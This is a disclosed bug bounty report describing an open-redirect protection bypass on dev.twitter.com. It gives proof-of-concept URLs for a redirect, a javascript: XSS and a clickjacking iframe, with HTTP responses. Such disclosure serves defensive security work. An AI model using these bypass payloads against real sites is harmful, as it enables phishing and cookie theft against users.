# [dev.twitter.com] XSS and Open Redirect Protection Bypass

## Report Details
- **Report ID**: 330008
- **URL**: https://hackerone.com/reports/330008
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-03-26T14:44:33.635Z
- **Disclosed**: 2019-02-07T16:32:13.022Z

## Reporter
- **Username**: bywalks
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Description:
Hi 
after I finish reading the report https://hackerone.com/reports/260744.i start to test this subdomain.i fount an interesting url [https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/basics/adding-international-support-to-your-apps].this url is special,my intuition tells me that this URL may have a problem.so,i try test,amzing i found a way to bypass protection.

PoC: Open Redirect
https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/

HTTP Response:
HTTP/1.1 302 Found
location: http://www.bywalks.com
...
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="http://www.bywalks.com">http://www.bywalks.com</a>.  If not click the link.

PoC: XSS
https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/javascript:alert(1)/

HTTP Response:
HTTP/1.1 302 Found
location: javascript:alert(1)
...
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="javascript:alert(1)">javascript:alert(1)</a>.  If not click the link.

PoC: ClickJacking
<iframe src="https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/http://www.bywalks.com/" sandbox="allow-forms"></iframe>

## Impact

go fishing.steal cookie,etc

## Attachments
No attachments
